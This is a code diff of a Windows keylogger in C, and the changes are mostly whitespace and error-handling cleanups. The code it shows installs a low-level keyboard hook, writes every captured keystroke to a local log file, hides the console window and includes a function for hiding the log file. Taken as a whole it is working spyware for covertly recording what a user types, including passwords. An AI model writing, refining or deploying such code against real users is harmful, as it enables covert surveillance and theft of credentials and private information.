@@ -5,6 +5,7 @@
 
 // Initialize empty hook
 HHOOK hook = NULL;
+
 // Tracks amount of characters per line
 int charCount = 0;
 
@@ -12,16 +13,19 @@ int charCount = 0;
 LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
     FILE *f;
+
+    // Open keylog file in append mode
     f = fopen("log", "a+");
 
-	if (nCode < 0)
+    if (nCode < 0)
     {
         CallNextHookEx(hook, nCode, wparam, lparam);
     }
 
-	KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*) lparam;
-	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
-	{
+    KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*) lparam;
+
+    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
+    {
         // Logs alphanumeric keys
         if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A)
         {
@@ -62,24 +66,27 @@ LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam)
             fprintf(f, "\n");
             charCount = 0;
         }
-	}
+    }
 
     fclose(f);
 
-	return CallNextHookEx(hook, nCode, wparam, lparam);
+    return CallNextHookEx(hook, nCode, wparam, lparam);
 }
 
 int setKeylogHook()
 {
-	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeylogProc, GetModuleHandle(NULL), 0);
-	return hook == NULL;
+    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeylogProc, GetModuleHandle(NULL), 0);
+
+    return hook == NULL;
 }
 
 int removeKeylogHook()
 {
-	int unhook_status = UnhookWindowsHookEx(hook);
-	hook = NULL;
-	return unhook_status;
+    int unhook_status = UnhookWindowsHookEx(hook);
+
+    hook = NULL;
+
+    return unhook_status;
 }
 
 void hideLogFile()
@@ -91,6 +98,7 @@ void hideLogFile()
 void writeTimestampToLogFile()
 {
     FILE *f;
+
     f = fopen("log", "a+");
 
     time_t t = time(NULL);
@@ -110,31 +118,32 @@ int main()
 {
     // Hides console window
     ShowWindow(GetConsoleWindow(), 0);
-    
+
     // Initializes log file
     initLogFile();
-    
+
     // Error handling for keylog hook creation
     if (setKeylogHook() != 0)
     {
-        printf("Error setting keylog hook.\n\n");
-        return -1;
+        fprintf(stderr, "Error setting keylog hook.\n\n");
+        exit(EXIT_FAILURE);
     }
-    
+
     MSG msg;
-    
+
     while (GetMessage(&msg, NULL, 0, 0))
     {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
-    
+
     // Error handling for keylog hook removal
     if (removeKeylogHook() != 0)
     {
-        printf("Error removing keylog hook.\n\n");
-        return -1;
+        fprintf(stderr, "Error removing keylog hook.\n\n");
+        exit(EXIT_FAILURE);
     }
 
-	return 0;
+    return EXIT_SUCCESS;
 }
+
